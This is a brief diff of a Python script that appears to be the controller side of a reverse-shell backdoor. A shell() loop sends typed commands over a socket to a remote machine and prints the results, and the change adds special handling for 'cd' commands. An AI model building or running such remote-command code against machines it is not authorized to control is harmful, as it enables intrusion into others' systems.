@@ -1,10 +1,11 @@
 #!/usr/bin/python
 # Written By: Sahar Hathiramani
-# Date: 01/22/2021
+# Date: 01/21/2021-01/23/2021
 
 import socket
 from termcolor import colored
 import json
+import os
 
 def reliable_send(data):
     jsonData = json.dumps(data)
@@ -25,6 +26,8 @@ def shell():
         reliable_send(command)
         if command == 'exit':
             break
+        elif command[:2] == "cd" and len(command) > 1:
+            continue
         else:
             result = reliable_recv()
             print(result)
